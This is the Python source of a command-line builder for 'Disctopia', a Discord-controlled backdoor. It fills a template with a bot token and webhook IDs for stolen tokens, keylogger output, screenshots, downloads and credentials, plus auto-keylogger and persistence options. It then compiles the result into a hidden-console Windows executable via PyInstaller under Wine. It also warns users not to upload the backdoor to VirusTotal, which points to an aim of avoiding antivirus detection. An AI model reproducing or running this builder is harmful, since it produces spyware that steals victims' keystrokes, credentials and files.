# -*- coding: utf-8 -*-

import json
import subprocess
import os
import argparse
import distro
from prettytable import PrettyTable
from sys import platform as OS

class Builder:
    
    def __init__(self,BACKDOOR_NAME,BOT_TOKEN,TOKEN_WEBHOOK,KEYLOGGER_WEBHOOK,SCREENSHOTS_ID,DOWNLOADS_ID,AGENT_ONLINE_ID,CREDENTIALS_ID,KEYLOG,PERSISTENT,DEBUG):
        self.BACKDOOR_NAME = BACKDOOR_NAME
        self.KEYLOG = KEYLOG
        self.PERSISTENT = PERSISTENT
        self.KEYLOGGER_WEBHOOK = KEYLOGGER_WEBHOOK
        self.BOT_TOKEN = BOT_TOKEN
        self.TOKEN_WEBHOOK = TOKEN_WEBHOOK
        self.SCREENSHOTS_ID = SCREENSHOTS_ID
        self.DOWNLOADS_ID = DOWNLOADS_ID
        self.AGENT_ONLINE_ID = AGENT_ONLINE_ID
        self.CREDENTIALS_ID = CREDENTIALS_ID
        self.DEBUG = DEBUG
        self.distro = distro.name()
        self.path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe')


    def build(self):
        
        f = open("code/main.py", 'r')
        file = f.read()
        f.close()

        newfile = file.replace("{KEYLOG}", str(self.KEYLOG).capitalize())
        newfile = newfile.replace("{PERSISTENT}", str(self.PERSISTENT))
        newfile = newfile.replace("{BOT_TOKEN}", str(self.BOT_TOKEN))
        newfile = newfile.replace("{TOKEN_WEBHOOK}", str(self.TOKEN_WEBHOOK))
        newfile = newfile.replace("{KEYLOGGER_WEBHOOK}", str(self.KEYLOGGER_WEBHOOK))
        newfile = newfile.replace("{SCREENSHOTS_ID}", str(self.SCREENSHOTS_ID))
        newfile = newfile.replace("{DOWNLOADS_ID}", str(self.DOWNLOADS_ID))
        newfile = newfile.replace("{AGENT_ONLINE_ID}", str(self.AGENT_ONLINE_ID))
        newfile = newfile.replace("{CREDENTIALS_ID}", str(self.CREDENTIALS_ID))

        f = open(self.BACKDOOR_NAME+".py", 'w')
        f.write(newfile)
        f.close()
        
        self.compile()

    def compile(self):
        if "Arch" in self.distro or "Manjaro" in self.distro:
           self.path_to_pyinstaller = os.path.expanduser('~/.wine/drive_c/users/root/AppData/Local/Programs/Python/Python38-32/Scripts/pyinstaller.exe')
        compile_command = ["wine", self.path_to_pyinstaller, "--onefile", "--noconsole", "--icon=img/exe_file.ico", self.BACKDOOR_NAME+".py"]
        if self.DEBUG == True:
            compile_command.pop(3)
        if os.name == 'nt':
            compile_command[1] = 'venv/Scripts/pyinstaller.exe'
            compile_command.remove("wine")
        subprocess.call(compile_command)
        try:
            os.remove(self.BACKDOOR_NAME+".py");os.remove(self.BACKDOOR_NAME+".spec")
        except FileNotFoundError:
            pass

def clear_screen():
    
    if OS == "win32":
        os.system("cls")
    if OS == "linux" or OS == "linux2":
        os.system("clear")

clear_screen()

print('''
▓█████▄  ██▓  ██████  ▄████▄  ▄▄▄█████▓ ▒█████   ██▓███   ██▓ ▄▄▄      
▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▓  ██▒ ▓▒▒██▒  ██▒▓██░  ██▒▓██▒▒████▄    
░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒ ▓██░ ▒░▒██░  ██▒▓██░ ██▓▒▒██▒▒██  ▀█▄  
░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒░ ▓██▓ ░ ▒██   ██░▒██▄█▓▒ ▒░██░░██▄▄▄▄██ 
░▒████▓ ░██░▒██████▒▒▒ ▓███▀ ░  ▒██▒ ░ ░ ████▓▒░▒██▒ ░  ░░██░ ▓█   ▓██▒
 ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░  ▒ ░░   ░ ▒░▒░▒░ ▒▓▒░ ░  ░░▓   ▒▒   ▓▒█░
 ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒       ░      ░ ▒ ▒░ ░▒ ░      ▒ ░  ▒   ▒▒ ░
 ░ ░  ░  ▒ ░░  ░  ░  ░          ░      ░ ░ ░ ▒  ░░        ▒ ░  ░   ▒   
   ░     ░        ░  ░ ░                   ░ ░            ░        ░  ░
 ░                   ░                                                 

Made by Dimitris Kalopisis | Twitter: @DKalopisis | Version: 1.2.0\n\n\n''')

list =["None","None","None","None","None","None","None","None","None","None"]

def getArgs():
    parser = argparse.ArgumentParser(description='Disctopia Backdoor Builder')
    parser.add_argument('-b', '--build', help='Build the Backdoor', action='store_true')

    return parser.parse_args()

def createTable(list):
    table = PrettyTable(["Setting", "Value"])

    table.add_row(["Backdoor-Name", list[0]])
    table.add_row(["Bot-Token", list[1]])
    table.add_row(["Token-Webhook", list[2]])
    table.add_row(["Keylogger-Webhook", list[3]])
    table.add_row(["Screenshots-ID", list[4]])
    table.add_row(["Downloads-ID", list[5]])
    table.add_row(["Agent-Online-ID", list[6]])
    table.add_row(["Credentials-ID", list[7]])
    table.add_row(["Auto-Keylogger", list[8]])
    table.add_row(["Auto-Persistent", list[9]])

    return table

def fetch(list):
    with open("settings.json", 'r') as file:
        data = json.load(file)
        list[0] = data["settings"]["backdoor-name"]
        list[1] = data["settings"]["bot-token"]
        list[2] = data["settings"]["token-webhook"]
        list[3] = data["settings"]["keylogger-webhook"]
        list[4] = data["settings"]["screenshots-id"]
        list[5] = data["settings"]["downloads-id"]
        list[6] = data["settings"]["agent-online-id"]
        list[7] = data["settings"]["credentials-id"]
        list[8] = data["settings"]["auto-keylogger"]
        list[9] = data["settings"]["auto-persistent"]

    return list

arguments = getArgs()

if arguments.build:
    if os.path.isfile("settings.json"):
        list = fetch(list)
        print(createTable(list))
        answer =  input("\nAre the backdoor settings correct? (Y/N) \n").lower()
        if answer == "y":
            print("\n[+] Building the Backdoor")
            print("[+] Please wait...\n")
            builder = Builder(list[0],list[1],list[2],list[3],list[4],list[5],list[6],list[7],list[8],list[9])
            builder.build()
            print('\n[+] The Backdoor can be found inside the "dist" directory')
            print('\nDO NOT UPLOAD THE BACKDOOR TO VIRUS TOTAL')
        else:
            exit()
    else:
        print("[-] settings.json not found!")

else:
    cont = True

    print('Run "help" to get the help menu')

    try:

        while cont:
            try:
                command = input("[+] > ")
                command_list = command.split()

                if command_list[0] == "exit":
                    print("\n[+] Exiting!")
                    exit()

                elif command_list[0] == "help":
                    print('''\n
            Help Menu:

            "help" Displays this message

            "set SETTING VALUE" Sets a value to a valid setting

            "fetch" Fetches the settings from the settings.json file

            "config" Shows the settings and their values

            "build" Packages the backdoor into an EXE file

            "exit" Terminates the builder
                        \n''')
                
                elif command_list[0] == "config":
                    table = createTable(list)
                    
                    print(f"\n{table.get_string(title='Disctopia Backdoor Settings')}\n")

                elif command_list[0] == "fetch":
                    if os.path.isfile("settings.json"):
                        fetch(list)
                        print("\n[+] Settings fetched from settings.json!\n")
                    else:
                        print("\n[-] settings.json not found!\n")

                elif command_list[0] == "build":
                    answer = input("\nAre you sure everything is setup correctly? Y/N \n").lower()
                    
                    if answer == "y":
                        print("\n[+] Building the Backdoor")
                        print("[+] Please wait...\n")
                        if "-d" in command_list:
                            debug = True 
                        else:
                            debug = False
                        builder = Builder(BACKDOOR_NAME=list[0],BOT_TOKEN=list[1],TOKEN_WEBHOOK=list[2],KEYLOGGER_WEBHOOK=list[3],SCREENSHOTS_ID=list[4],DOWNLOADS_ID=list[5],AGENT_ONLINE_ID=list[6],CREDENTIALS_ID=list[7],KEYLOG=list[8],PERSISTENT=list[9],DEBUG=debug)
                        builder.build()
                        cont = False
                        print('\n[+] The Backdoor can be found inside the "dist" directory')
                        print('\nDO NOT UPLOAD THE BACKDOOR TO VIRUS TOTAL')

                    elif answer == "n":
                        pass

                    else:
                        print("\n[-] Invalid Answer\n")

                elif command_list[0] == "set":

                    if command_list[1].lower() == "backdoor-name":
                        list[0] = command_list[2]
                        print(f"\n[+] Changed Backdoor-Name\n")

                    elif command_list[1].lower() == "bot-token":
                        list[1] = command_list[2]
                        print(f"\n[+] Changed Bot-Token to \n")

                    elif command_list[1].lower() == "token-webhook":
                        list[2] = command_list[2]
                        print(f"\n[+] Changed Token-Webhook\n")

                    elif command_list[1].lower() == "keylogger-webhook":
                        list[3] = command_list[2]
                        print(f"\n[+] Changed Keylogger-Webhook\n")

                    elif command_list[1].lower() == "screenshots-id":
                        list[4] = command_list[2]
                        print(f"\n[+] Changed Screenshots-ID\n")

                    elif command_list[1].lower() == "downloads-id":
                        list[5] = command_list[2]
                        print(f"\n[+] Changed Downloads-ID\n")

                    elif command_list[1].lower() == "agent-online-id":
                        list[6] = command_list[2]
                        print(f"\n[+] Changed Agent-Online-ID\n")

                    elif command_list[1].lower() == "credentials-id":
                        list[7] = command_list[2]
                        print(f"\n[+] Changed Credentials-ID\n")

                    elif command_list[1].lower() == "auto-keylogger":
                        list[8] = command_list[2]
                        print(f"\n[+] Changed Auto-Keylogger\n")

                    elif command_list[1].lower() == "auto-persistent":
                        list[9] = command_list[2]
                        print(f"\n[+] Changed Auto-Persistent\n")

                    else:
                        print(f'\n[-] Unknown Setting "{command_list[1]}" Try "help"\n')
                else:
                    print(f'\n[-] Unknown Command "{command_list[0]}" Try "help"\n')
            
            except IndexError:
                pass

    except KeyboardInterrupt:
        print("\n\n[+] Exiting")
